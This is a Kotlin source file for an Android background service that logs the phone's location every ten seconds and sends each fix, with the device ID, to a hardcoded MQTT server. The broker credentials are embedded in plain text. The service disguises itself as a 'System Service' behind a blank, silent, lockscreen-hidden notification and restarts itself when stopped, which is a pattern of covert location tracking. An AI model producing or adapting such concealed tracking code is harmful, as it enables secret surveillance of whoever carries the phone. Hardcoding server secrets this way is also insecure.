package com.ars.gpslogger

import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class GpsLoggerService : Service() {

    companion object {
        const val TAG = "GpsLogger"
        const val MQTT_HOST  = "tcp://144.24.113.211:1883"
        const val MQTT_USER  = "ars"
        const val MQTT_PASS  = "@r$"
        const val MQTT_TOPIC = "gps/phone1"
        const val CHANNEL_ID = "gps_service"
        const val NOTIF_ID   = 1
    }

    private lateinit var db: GpsDatabase
    private lateinit var deviceId: String
    private lateinit var locationManager: LocationManager

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            Log.d(TAG, "Location received: ${location.latitude}, ${location.longitude}")
            val ts = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                .apply { timeZone = TimeZone.getTimeZone("UTC") }
                .format(Date(location.time))

            db.insert(location.latitude, location.longitude, location.altitude, location.accuracy.toDouble(), ts)
            uploadPending()
        }

        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        db = GpsDatabase(this)
        createNotificationChannel()
        startForegroundCompat()
        startLocationUpdates()
    }

    private fun startLocationUpdates() {
        if (ContextCompat.checkSelfPermission(
                this, android.Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED) return

        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager

        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                10000L,  // 10 seconds
                0f,
                locationListener,
                Looper.getMainLooper()
            )
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                10000L,
                0f,
                locationListener,
                Looper.getMainLooper()
            )
        } catch (e: Exception) {
            Log.e(TAG, "Location update error: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        locationManager.removeUpdates(locationListener)
        startService(Intent(applicationContext, GpsLoggerService::class.java))
    }

    private fun uploadPending() {
        if (!isOnline()) return
        Thread {
            val pending = db.getPending()
            if (pending.isEmpty()) return@Thread
            try {
                val client = MqttClient(MQTT_HOST, deviceId, MemoryPersistence())
                val options = MqttConnectOptions().apply {
                    userName = MQTT_USER
                    password = MQTT_PASS.toCharArray()
                    isCleanSession = true
                    connectionTimeout = 15
                    keepAliveInterval = 30
                }
                client.connect(options)
                for (row in pending) {
                    val payload = JSONObject().apply {
                        put("lat", row.lat)
                        put("lon", row.lon)
                        put("alt", row.alt)
                        put("acc", row.acc)
                        put("ts", row.ts)
                        put("dev", deviceId)
                    }.toString()
                    client.publish(
                        MQTT_TOPIC,
                        MqttMessage(payload.toByteArray()).apply { qos = 1 }
                    )
                    db.markUploaded(row.id)
                }
                client.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "MQTT error: ${e.message}")
            }
        }.start()
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val net = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(net) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun startForegroundCompat() {
        val n = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIF_ID, n)
        }
    }
}
